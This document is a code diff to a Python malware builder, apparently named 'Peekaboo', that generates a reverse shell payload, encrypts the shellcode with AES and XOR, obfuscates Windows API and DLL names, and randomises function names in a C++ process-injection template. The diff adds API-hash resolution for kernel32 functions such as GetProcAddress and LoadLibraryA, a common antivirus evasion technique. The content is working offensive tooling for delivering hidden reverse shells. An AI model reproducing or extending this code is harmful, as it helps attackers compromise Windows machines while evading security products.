@@ -8,6 +8,8 @@ import hashlib
 import string
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
+from Crypto import Random
+from Crypto.Util.Padding import pad
 
 class Colors:
     HEADER = '\033[95m'
@@ -23,6 +25,7 @@ class Colors:
 class PeekabooEncryptor():
     def __init__(self):
         self.XOR_PAYLOAD = self.random()
+        self.XOR_FUNC = self.random()
         self.XOR_PROC = self.random()
         self.XOR_DLL = self.random()
 
@@ -63,9 +66,6 @@ class PeekabooEncryptor():
         length = random.randint(16, 32)
         return ''.join(random.choice(string.ascii_letters) for i in range(length))
 
-    def pad(self, s):
-        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
-
     def convert(self, data):
         output_str = ""
         for i in range(len(data)):
@@ -80,17 +80,25 @@ class PeekabooEncryptor():
     # then it is used as a key for encrypting plaintext
     def aes_encrypt(self, plaintext, key):
         k = hashlib.sha256(key).digest()
-        iv = 16 * '\x00'
-        plaintext = self.pad(plaintext)
-        cipher = AES.new(k, AES.MODE_CBC, iv.encode("UTF-8"))
-        ciphertext = cipher.encrypt(plaintext.encode("UTF-8"))
+        iv = 16 * b'\x00'
+        plaintext = pad(plaintext, AES.block_size)
+        cipher = AES.new(k, AES.MODE_CBC, iv)
+        ciphertext = cipher.encrypt(plaintext)
         ciphertext, key = self.convert(ciphertext), self.convert(key)
         ciphertext = '{' + (' 0x'.join(x + "," for x in ciphertext)).strip(",") + ' };'
         key = '{' + (' 0x'.join(x + "," for x in key)).strip(",") + ' };'
+        # print (ciphertext, key)
         return ciphertext, key
 
     def random_bytes(self):
         return get_random_bytes(16)
+
+class PeekabooHasher():
+    def hashing(self, data):
+        hash = 0x35
+        for i in range(0, len(data)):
+            hash += ord(data[i]) + (hash << 1)
+        return hash
 
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
@@ -122,6 +130,7 @@ def run_peekaboo(host, port, proc_name, mode):
     print (Colors.BLUE + banner + Colors.ENDC)
     generate_payload(host, port)
     encryptor = PeekabooEncryptor()
+    hasher = PeekabooHasher()
     print (Colors.BLUE + "read payload..." + Colors.ENDC)
     plaintext = open("/tmp/hack.bin", "rb").read()
     # plaintext = open("./meow.bin", "rb").read()
@@ -140,6 +149,9 @@ def run_peekaboo(host, port, proc_name, mode):
     f_xor = "XOR("
     f_ftt = "findMyProc("
     f_aes = "AESDecrypt("
+    f_cmh = "calcMyHash"
+    f_cmhb = "calcMyHashBase"
+    f_gk32 = "getKernel32"
 
     k32_name = "kernel32"
     ntdll_name = "ntdll"
@@ -147,20 +159,26 @@ def run_peekaboo(host, port, proc_name, mode):
     print (Colors.BLUE + "process name: " + proc_name + "..." + Colors.ENDC)
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
     f_xor, f_ftt, f_aes = encryptor.random(), encryptor.random(), encryptor.random()
-    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
-    ciphertext_ntop, ntop_key = encryptor.aes_encrypt(f_ntop, encryptor.aes_key())
-    ciphertext_ntcs, ntcs_key = encryptor.aes_encrypt(f_ntcs, encryptor.aes_key())
-    ciphertext_ntmvos, ntmvos_key = encryptor.aes_encrypt(f_ntmvos, encryptor.aes_key())
-    ciphertext_rcut, rcut_key = encryptor.aes_encrypt(f_rcut, encryptor.aes_key())
-    ciphertext_wfso, wfso_key = encryptor.aes_encrypt(f_wfso, encryptor.aes_key())
-    ciphertext_clh, clh_key = encryptor.aes_encrypt(f_clh, encryptor.aes_key())
+    f_cmh, f_cmhb, f_gk32 = encryptor.random(), encryptor.random(), encryptor.random()
+    ciphertext, p_key = encryptor.aes_encrypt(plaintext, encryptor.aes_key())
+    ciphertext_ntop, ntop_key = encryptor.xor_encrypt(f_ntop, encryptor.func_key())
+    ciphertext_ntcs, ntcs_key = encryptor.xor_encrypt(f_ntcs, encryptor.func_key())
+    ciphertext_ntmvos, ntmvos_key = encryptor.xor_encrypt(f_ntmvos, encryptor.func_key())
+    ciphertext_rcut, rcut_key = encryptor.xor_encrypt(f_rcut, encryptor.func_key())
+    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
+    ciphertext_clh, clh_key = encryptor.xor_encrypt(f_clh, encryptor.func_key())
     ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
     ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
-    ciphertext_zw, zw_key = encryptor.aes_encrypt(f_zw, encryptor.aes_key())
+    ciphertext_zw, zw_key = encryptor.xor_encrypt(f_zw, encryptor.func_key())
     ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
     ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
     ciphertext_k32, k32_key = encryptor.xor_encrypt(k32_name, encryptor.dll_key())
-    ciphertext_ntd, ntd_key = encryptor.xor_encrypt(ntdll_name, encryptor.dll_key()) 
+    ciphertext_ntd, ntd_key = encryptor.xor_encrypt(ntdll_name, encryptor.dll_key())
+
+    kernel32_hash = hasher.hashing("kernel32.dll")
+    getmodulehandle_hash = hasher.hashing("GetModuleHandleA")
+    getprocaddress_hash = hasher.hashing("GetProcAddress")
+    loadlibrarya_hash = hasher.hashing("LoadLibraryA")
 
     tmp = open("peekaboo_nt.cpp", "rt")
     data = tmp.read()
@@ -180,15 +198,15 @@ def run_peekaboo(host, port, proc_name, mode):
     data = data.replace('unsigned char s_k32[] = { };', 'unsigned char s_k32[] = ' + ciphertext_k32)
     data = data.replace('unsigned char s_ntd[] = { };', 'unsigned char s_ntd[] = ' + ciphertext_ntd)
 
-    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
+    data = data.replace('unsigned char my_payload_key[] = "";', 'unsigned char my_payload_key[] = ' + p_key)
     data = data.replace('char my_proc_key[] = "";', 'char my_proc_key[] = "' + proc_key + '";')
-    data = data.replace('char s_ntop_key[] = "";', 'char s_ntop_key[] = ' + ntop_key)
-    data = data.replace('char s_ntcs_key[] = "";', 'char s_ntcs_key[] = ' + ntcs_key)
-    data = data.replace('char s_ntmvos_key[] = "";', 'char s_ntmvos_key[] = ' + ntmvos_key)
-    data = data.replace('char s_zw_key[] = "";', 'char s_zw_key[] = ' + zw_key)
-    data = data.replace('char s_rcut_key[] = "";', 'char s_rcut_key[] = ' + rcut_key)
-    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = ' + wfso_key)
-    data = data.replace('char s_clh_key[] = "";', 'char s_clh_key[] = ' + clh_key)
+    data = data.replace('char s_ntop_key[] = "";', 'char s_ntop_key[] = "' + ntop_key + '";')
+    data = data.replace('char s_ntcs_key[] = "";', 'char s_ntcs_key[] = "' + ntcs_key + '";')
+    data = data.replace('char s_ntmvos_key[] = "";', 'char s_ntmvos_key[] = "' + ntmvos_key + '";')
+    data = data.replace('char s_zw_key[] = "";', 'char s_zw_key[] = "' + zw_key + '";')
+    data = data.replace('char s_rcut_key[] = "";', 'char s_rcut_key[] = "' + rcut_key + '";')
+    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
+    data = data.replace('char s_clh_key[] = "";', 'char s_clh_key[] = "' + clh_key + '";')
     data = data.replace('char s_p32f_key[] = "";', 'char s_p32f_key[] = "' + p32f_key + '";')
     data = data.replace('char s_p32n_key[] = "";', 'char s_p32n_key[] = "' + p32n_key + '";')
     data = data.replace('char s_ct32s_key[] = "";', 'char s_ct32s_key[] = "' + ct32s_key + '";')
@@ -197,6 +215,15 @@ def run_peekaboo(host, port, proc_name, mode):
     data = data.replace('XOR(', f_xor + "(")
     data = data.replace('AESDecrypt(', f_aes + "(")
     data = data.replace("findMyProc(", f_ftt + "(")
+    data = data.replace("calcMyHash(", f_cmh + "(")
+    data = data.replace("calcMyHashBase(", f_cmhb + "(")
+    data = data.replace("getKernel32(", f_gk32 + "(")
+
+    print (Colors.BLUE + "calculating win API hashes..." + Colors.ENDC)
+    data = data.replace('#define KERNEL32_HASH 0x00000000', '#define KERNEL32_HASH ' + str(kernel32_hash))
+    data = data.replace('#define GETMODULEHANDLE_HASH 0x00000000', '#define GETMODULEHANDLE_HASH ' + str(getmodulehandle_hash))
+    data = data.replace('#define GETPROCADDRESS_HASH 0x00000000', '#define GETPROCADDRESS_HASH ' + str(getprocaddress_hash))
+    data = data.replace('#define LOADLIBRARY_HASH 0x00000000', '#define LOADLIBRARY_HASH ' + str(loadlibrarya_hash))
 
     if mode == "console":
         data = data.replace("int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {", "int main(void) {")
